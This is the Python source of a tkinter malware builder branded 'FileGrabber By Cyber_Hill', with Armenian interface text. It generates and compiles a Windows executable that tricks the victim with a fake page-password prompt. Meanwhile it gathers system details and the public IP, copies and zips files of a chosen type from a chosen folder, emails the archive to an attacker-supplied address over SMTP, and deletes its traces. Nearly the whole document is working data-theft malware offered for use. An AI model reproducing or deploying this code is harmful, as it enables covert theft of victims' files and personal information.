import tkinter,os,subprocess
from tkinter import messagebox
from tkinter import ttk
from tkinter.ttk import Style, Button, Entry, Scrollbar

root=tkinter.Tk()
root.title('FileGrabber By Cyber_Hill')
root.geometry("400x400")

main_menu = tkinter.Menu()
file_menu = tkinter.Menu(tearoff=0)
smtpservers = tkinter.Label(text="SMTP Server",  width=60, foreground='black')
entry = tkinter.Entry(width=60, bg="white", fg="black")
ports = tkinter.Label(text="Port",  width=60, foreground='black')
entry1 = tkinter.Entry(width=60, bg="white", fg="black")
sendmail=tkinter.Label(text="Ձեր էլ․փստը",  width=60, foreground='black')
entry2 = tkinter.Entry(width=60, bg="white", fg="black")
passmail=tkinter.Label(text="Ձեր էլ․փստի գաղտնաբառը",  width=60, foreground='black')
entry3 = tkinter.Entry(width=60, bg="white", fg="black")
recemail=tkinter.Label(text="Այն էլ.փոստը որին պետք է ուղարկել տվյալները",  width=60, foreground='black')
entry4 = tkinter.Entry(width=60, bg="white", fg="black")
parsdic=tkinter.Label(text="Այն կատալոգը որտեղից պետք հավաքել ֆայլերի տվյալները",  width=60, foreground='black')
entry5 = tkinter.Entry(width=60, bg="white", fg="black")
filetype=tkinter.Label(text="Այն ֆայլի տեսակը որոնք պետք արխիվացվնել և ուղարկել",  width=60, foreground='black')
entry6 = tkinter.Entry(width=60, bg="white", fg="black")

def genrat():
    mailserver=entry.get()
    portss=entry1.get()
    sendemail=entry2.get()
    password=entry3.get()
    recmail=entry4.get()
    parsingdic=entry5.get()
    filestype=entry6.get()
    if not mailserver or not portss or not sendemail or not password or not recmail or not parsingdic or not filestype:
        messagebox.showerror("Սխալ", "Բոլոր դաշտերը պարտադիր են լրացման համար")
    elif mailserver and portss and sendemail and password and recmail and parsingdic and filestype:
        try:
            dicsym="{}"
            names="{dic}"
            filesize=os.stat("log.txt").st_size == 0
            if filesize == True:
                open('Program.py', 'w').close()
            my_file = open("Program.py", "a+",encoding='utf-8')
            my_file.write(f"""
import json
import logging
import os
import platform
import psutil
import random
import re
import requests
import shutil
import smtplib
import socket
import uuid
import zipfile
from email.message import EmailMessage

link=input('Մուտքագրեք Username-ը կամ Էջի հղումը: ')
print('Խնդրում ենք սպասել')
def getSystemInfo():
    try:
        ip = requests.get('https://api.ipify.org').text
        info = {dicsym}
        info['platform'] = platform.system()
        info['platform-release'] = platform.release()
        info['platform-version'] = platform.version()
        info['architecture'] = platform.machine()
        info['hostname'] = socket.gethostname()
        info['ip-address'] = socket.gethostbyname(socket.gethostname())
        info['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor'] = platform.processor()
        info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
        info['Global IP'] = ip
        return json.dumps(info)
    except Exception as e:
        logging.exception(e)


info = json.loads(getSystemInfo())
info = str(info)
Sender_Email = "{sendemail}"
Reciever_Email = "{recmail}"
Password = "{password}"
newMessage = EmailMessage()
newMessage['Subject'] = "Logs"
newMessage['From'] = Sender_Email
newMessage['To'] = Reciever_Email
newMessage.set_content(info)
path = r'{parsingdic}'
chars = 'abcdefghijklnopqrstuvwxyz'
dic = ''
for n in range(1):
    for i in range(10):
        dic += random.choice(chars)
os.mkdir(f'C:\{names}')
path = r'{parsingdic}'
for root, directories, file in os.walk(path):
    for file in file:
        if (file.endswith(f"{filestype}")):
            paths = os.path.join(root, file)
        dst = f"C:/{names}/"
        shutil.copy(paths, dst, follow_symlinks=True)
open('log.txt', 'w').close()
with open(f'C:\{names}\log.txt', 'a', encoding="utf-8") as fs:
    for root, directories, file in os.walk(path):
        for file in file:
            filename = os.path.join(root, file)
            fs.write(filename + {"'/n'"})
def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))


zipf = zipfile.ZipFile('log.zip', 'w', zipfile.ZIP_DEFLATED)
zipdir(f'C:\{names}', zipf)
zipf.close()


files = ['log.zip']
for file in files:
    with open(file, 'rb') as f:
        file_data = f.read()
        file_name = f.name
    newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
with smtplib.SMTP_SSL('{mailserver}', {portss}) as smtp:
    smtp.login(Sender_Email, Password)
    smtp.send_message(newMessage)
shutil.rmtree(f'C:\{names}', ignore_errors=True)
os.remove('log.zip')
print(f'Էջի գաղտնաբառը։ {names}')
input('')

""")
            my_file.close()
            cwd=os.getcwd()
            command = "pyinstaller --onefile Program.py"
            networks = subprocess.check_output(command, shell=True)
            messagebox.showinfo("Success", f"Ձեր Rat-ը հաջողությամբ ստեղծվեց\nՖայլի գտնվելու վայրը։ {cwd}\dist\Program.exe")
        except Exception as e:
            print(e)
            messagebox.showerror("Սխալ", "Տեղի է ունեցել սխալ փորձեք նորից ստեղծել")


def aboutus():
    messagebox.showinfo("About", "FileGrabber By Cyber_Hill\nTelegram:@Cyber_Hill")


def appexit():
    root.destroy()

file_menu.add_command(label="Build",command=genrat)
file_menu.add_command(label="About",command=aboutus)
file_menu.add_separator()
file_menu.add_command(label="Exit",command=appexit)
main_menu.add_cascade(label="File",menu=file_menu)

smtpservers.pack()
entry.pack()
ports.pack()
entry1.pack()
sendmail.pack()
entry2.pack()
passmail.pack()
entry3.pack()
recemail.pack()
entry4.pack()
parsdic.pack()
entry5.pack()
filetype.pack()
entry6.pack()

root.config(menu=main_menu)
root.resizable(False, False)
root.mainloop()
